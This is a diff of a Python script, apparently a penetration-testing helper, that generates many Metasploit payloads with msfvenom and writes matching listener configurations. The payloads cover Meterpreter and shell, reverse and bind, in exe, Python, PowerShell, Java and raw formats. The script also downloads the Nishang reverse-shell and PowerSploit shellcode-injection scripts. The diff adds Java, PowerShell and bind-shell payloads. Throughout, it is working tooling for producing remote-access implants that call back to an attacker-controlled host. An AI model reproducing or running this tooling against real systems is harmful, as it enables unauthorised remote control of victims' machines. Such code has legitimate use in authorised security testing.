@@ -7,9 +7,9 @@
 #   apt-get install winbind
 
 # On Kali:
-#   apt-get install python3-netifaces python3-requests
+#   apt-get install python3-requests
 # Or:
-#   pip install netifaces requests
+#   pip install requests
 
 import subprocess
 import os
@@ -17,15 +17,15 @@ import shutil
 import stat
 import requests
 from urllib.parse import urlparse
-from netifaces import AF_INET, ifaddresses
+import socket
 
-SERVER = ifaddresses('eth0')[AF_INET][0]['addr']
+SERVER = socket.gethostbyname(socket.gethostname())
 WEBSERVER_PORT = 8000
 
 PS_REV_TCP_URL = "https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1"
 PS_INV_SC_URL = "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-Shellcode.ps1"
 
-PYTHON_DOWNLOAD_URL = "https://www.python.org/ftp/python/2.7.12/python-2.7.12.msi"
+PYTHON_DOWNLOAD_URL = "https://www.python.org/ftp/python/2.7.13/python-2.7.13.msi"
 PYTHON_MSI = os.path.basename(urlparse(PYTHON_DOWNLOAD_URL).path)
 
 PY_TEMPLATE = """#!/usr/bin/env python
@@ -59,8 +59,6 @@ httpd.serve_forever()
 
 
 SCRIPT_DIR = os.path.dirname(os.path.realpath(__file__))
-
-
 WINE_DIR = '{}/wine'.format(SCRIPT_DIR)
 
 
@@ -70,10 +68,13 @@ def make_executable(f):
     os.chmod(fname, st.st_mode | stat.S_IEXEC)
 
 
-def add_handler(payload, server, port):
+def add_handler(payload, server, port, rhost=False):
     s = "use exploit/multi/handler\n"
     s += "set payload {}\n".format(payload)
-    s += "set lhost {}\n".format(server)
+    if rhost:
+        s += "set rhost {}\n".format(server)
+    else:
+        s += "set lhost {}\n".format(server)
     s += "set lport {}\n".format(port)
     s += "set ExitOnSession false\n"
     s += "exploit -j\n\n"
@@ -141,32 +142,54 @@ def setup_wine():
 
 PAYLOADS = [
     # exes
-    {'filename': 'reverse_http', 'payload': 'windows/meterpreter/reverse_http', 'port': 8001, 'format': 'exe'},
-    {'filename': 'reverse_https', 'payload': 'windows/meterpreter/reverse_https', 'port': 8002, 'format': 'exe'},
-    {'filename': 'reverse_tcp', 'payload': 'windows/meterpreter/reverse_tcp', 'port': 8003, 'format': 'exe'},
-    {'filename': 'meterpreter_reverse_http', 'payload': 'windows/meterpreter_reverse_http', 'port': 8004, 'format': 'exe'},
-    {'filename': 'meterpreter_reverse_https', 'payload': 'windows/meterpreter_reverse_https', 'port': 8005, 'format': 'exe'},
-    {'filename': 'meterpreter_reverse_tcp', 'payload': 'windows/meterpreter_reverse_tcp', 'port': 8006, 'format': 'exe'},
-    {'filename': 'reverse_tcp', 'payload': 'windows/shell/reverse_tcp', 'port': 8007, 'format': 'exe'},
-    {'filename': 'shell_reverse_tcp', 'payload': 'windows/shell_reverse_tcp', 'port': 8008, 'format': 'exe'},
+    {'filename': 'win_meter_rev_http_staged', 'payload': 'windows/meterpreter/reverse_http', 'port': 8001, 'format': 'exe'},
+    {'filename': 'win_meter_rev_https_staged', 'payload': 'windows/meterpreter/reverse_https', 'port': 8002, 'format': 'exe'},
+    {'filename': 'win_meter_rev_tcp_staged', 'payload': 'windows/meterpreter/reverse_tcp', 'port': 8003, 'format': 'exe'},
+    {'filename': 'win_meter_rev_http', 'payload': 'windows/meterpreter_reverse_http', 'port': 8004, 'format': 'exe'},
+    {'filename': 'win_meter_rev_https', 'payload': 'windows/meterpreter_reverse_https', 'port': 8005, 'format': 'exe'},
+    {'filename': 'win_meter_rev_tcp', 'payload': 'windows/meterpreter_reverse_tcp', 'port': 8006, 'format': 'exe'},
+    {'filename': 'win_meter_rev_winhttp_staged', 'payload': 'windows/meterpreter/reverse_winhttp', 'port': 8007, 'format': 'exe'},
+    {'filename': 'win_meter_rev_winhttps_staged', 'payload': 'windows/meterpreter/reverse_winhttps', 'port': 8008, 'format': 'exe'},
+    {'filename': 'win_meter_bind_tcp', 'payload': 'windows/meterpreter/bind_tcp', 'port': 8009, 'format': 'exe'},
+    {'filename': 'win_shell_rev_tcp_staged', 'payload': 'windows/shell/reverse_tcp', 'port': 8010, 'format': 'exe'},
+    {'filename': 'win_shell_rev_tcp', 'payload': 'windows/shell_reverse_tcp', 'port': 8011, 'format': 'exe'},
+    {'filename': 'win_shell_bind_tcp', 'payload': 'windows/shell/bind_tcp', 'port': 8012, 'format': 'exe'},
     # python stuff
-    {'filename': 'reverse_http_py', 'payload': 'windows/meterpreter/reverse_http', 'port': 8101, 'format': 'py'},
-    {'filename': 'reverse_https_py', 'payload': 'windows/meterpreter/reverse_https', 'port': 8102, 'format': 'py'},
-    {'filename': 'reverse_tcp_py', 'payload': 'windows/meterpreter/reverse_tcp', 'port': 8103, 'format': 'py'},
-    {'filename': 'meterpreter_reverse_http_py', 'payload': 'windows/meterpreter_reverse_http', 'port': 8104, 'format': 'py'},
-    {'filename': 'meterpreter_reverse_https_py', 'payload': 'windows/meterpreter_reverse_https', 'port': 8105, 'format': 'py'},
-    {'filename': 'meterpreter_reverse_tcp_py', 'payload': 'windows/meterpreter_reverse_tcp', 'port': 8106, 'format': 'py'},
-    {'filename': 'reverse_tcp_py', 'payload': 'windows/shell/reverse_tcp', 'port': 8107, 'format': 'py'},
-    {'filename': 'shell_reverse_tcp_py', 'payload': 'windows/shell_reverse_tcp', 'port': 8108, 'format': 'py'},
+    {'filename': 'win_meter_rev_http_staged', 'payload': 'windows/meterpreter/reverse_http', 'port': 8101, 'format': 'py'},
+    {'filename': 'win_meter_rev_https_staged', 'payload': 'windows/meterpreter/reverse_https', 'port': 8102, 'format': 'py'},
+    {'filename': 'win_meter_rev_tcp_staged', 'payload': 'windows/meterpreter/reverse_tcp', 'port': 8103, 'format': 'py'},
+    {'filename': 'win_meter_rev_http', 'payload': 'windows/meterpreter_reverse_http', 'port': 8104, 'format': 'py'},
+    {'filename': 'win_meter_rev_https', 'payload': 'windows/meterpreter_reverse_https', 'port': 8105, 'format': 'py'},
+    {'filename': 'win_meter_rev_tcp', 'payload': 'windows/meterpreter_reverse_tcp', 'port': 8106, 'format': 'py'},
+    {'filename': 'win_meter_rev_winhttp_staged', 'payload': 'windows/meterpreter/reverse_winhttp', 'port': 8107, 'format': 'py'},
+    {'filename': 'win_meter_rev_winhttps_staged', 'payload': 'windows/meterpreter/reverse_winhttps', 'port': 8108, 'format': 'py'},
+    {'filename': 'win_meter_bind_tcp', 'payload': 'windows/meterpreter/bind_tcp', 'port': 8109, 'format': 'py'},
+    {'filename': 'win_shell_rev_tcp_staged', 'payload': 'windows/shell/reverse_tcp', 'port': 8110, 'format': 'py'},
+    {'filename': 'win_shell_rev_tcp', 'payload': 'windows/shell_reverse_tcp', 'port': 8111, 'format': 'py'},
+    {'filename': 'win_shell_bind_tcp', 'payload': 'windows/shell/bind_tcp', 'port': 8112, 'format': 'py'},
     # invoke shellcode stuff
-    {'filename': 'reverse_http_ps', 'payload': 'windows/meterpreter/reverse_http', 'port': 8201, 'format': 'ps1'},
-    {'filename': 'reverse_https_ps', 'payload': 'windows/meterpreter/reverse_https', 'port': 8202, 'format': 'ps1'},
-    {'filename': 'reverse_tcp_ps', 'payload': 'windows/meterpreter/reverse_tcp', 'port': 8203, 'format': 'ps1'},
-    {'filename': 'meterpreter_reverse_http_ps', 'payload': 'windows/meterpreter_reverse_http', 'port': 8204, 'format': 'ps1'},
-    {'filename': 'meterpreter_reverse_https_ps', 'payload': 'windows/meterpreter_reverse_https', 'port': 8205, 'format': 'ps1'},
-    {'filename': 'meterpreter_reverse_tcp_ps', 'payload': 'windows/meterpreter_reverse_tcp', 'port': 8206, 'format': 'ps1'},
-    {'filename': 'reverse_tcp_ps', 'payload': 'windows/shell/reverse_tcp', 'port': 8207, 'format': 'ps1'},
-    {'filename': 'shell_reverse_tcp_ps', 'payload': 'windows/shell_reverse_tcp', 'port': 8208, 'format': 'ps1'}
+    {'filename': 'win_meter_rev_http_staged', 'payload': 'windows/meterpreter/reverse_http', 'port': 8201, 'format': 'ps1'},
+    {'filename': 'win_meter_rev_https_staged', 'payload': 'windows/meterpreter/reverse_https', 'port': 8202, 'format': 'ps1'},
+    {'filename': 'win_meter_rev_tcp_staged', 'payload': 'windows/meterpreter/reverse_tcp', 'port': 8203, 'format': 'ps1'},
+    {'filename': 'win_meter_rev_http', 'payload': 'windows/meterpreter_reverse_http', 'port': 8204, 'format': 'ps1'},
+    {'filename': 'win_meter_rev_https', 'payload': 'windows/meterpreter_reverse_https', 'port': 8205, 'format': 'ps1'},
+    {'filename': 'win_meter_rev_tcp', 'payload': 'windows/meterpreter_reverse_tcp', 'port': 8206, 'format': 'ps1'},
+    {'filename': 'win_meter_rev_winhttp_staged', 'payload': 'windows/meterpreter/reverse_winhttp', 'port': 8207, 'format': 'ps1'},
+    {'filename': 'win_meter_rev_winhttps_staged', 'payload': 'windows/meterpreter/reverse_winhttps', 'port': 8208, 'format': 'ps1'},
+    {'filename': 'win_meter_bind_tcp', 'payload': 'windows/meterpreter/bind_tcp', 'port': 8209, 'format': 'ps1'},
+    {'filename': 'win_shell_rev_tcp_staged', 'payload': 'windows/shell/reverse_tcp', 'port': 8210, 'format': 'ps1'},
+    {'filename': 'win_shell_rev_tcp', 'payload': 'windows/shell_reverse_tcp', 'port': 8211, 'format': 'ps1'},
+    {'filename': 'win_shell_bind_tcp', 'payload': 'windows/shell/bind_tcp', 'port': 8212, 'format': 'ps1'},
+    # java
+    {'filename': 'java_meter_bind_tcp', 'payload': 'java/meterpreter/bind_tcp', 'port': 8301, 'format': 'jar'},
+    {'filename': 'java_meter_rev_tcp_staged', 'payload': 'java/meterpreter/reverse_tcp', 'port': 8302, 'format': 'jar'},
+    {'filename': 'java_meter_rev_http_staged', 'payload': 'java/meterpreter/reverse_http', 'port': 8303, 'format': 'jar'},
+    {'filename': 'java_meter_rev_https_staged', 'payload': 'java/meterpreter/reverse_https', 'port': 8304, 'format': 'jar'},
+    # powershell
+    {'filename': 'ps_bind_tcp', 'payload': 'windows/powershell_bind_tcp', 'port': 8401, 'format': 'raw'},
+    {'filename': 'ps_rev_tcp', 'payload': 'windows/powershell_reverse_tcp', 'port': 8402, 'format': 'raw'},
+    # misc
+    {'filename': 'cmd_win_rev_ps', 'payload': 'cmd/windows/reverse_powershell', 'port': 8501, 'format': 'raw'},
 ]
 
 ADDITIONAL_HANDLERS = [
@@ -183,9 +206,14 @@ execute_command('env')
 setup_wine()
 
 for p in PAYLOADS:
-    command = 'msfvenom --platform windows -p {} -f {} -e generic/none -o {}/{}.{} LHOST={} LPORT={}'.format(p['payload'], p['format'], SCRIPT_DIR, p['filename'], p['format'], SERVER, p['port'])
+    rhost = True if "bind" in p['payload'] else False
+    if rhost:
+        host_s = "RHOST"
+    else:
+        host_s = "LHOST"
+    command = 'msfvenom --platform windows -p {} -f {} -e generic/none -o {}/{}.{} {}={} LPORT={}'.format(p['payload'], p['format'], SCRIPT_DIR, p['filename'], p['format'], host_s, SERVER, p['port'])
     execute_command(command)
-    handler += add_handler(p['payload'], SERVER, p['port'])
+    handler += add_handler(p['payload'], SERVER, p['port'], rhost)
     print()
     if p['format'] == 'exe':
         print("Generating packed payload...")
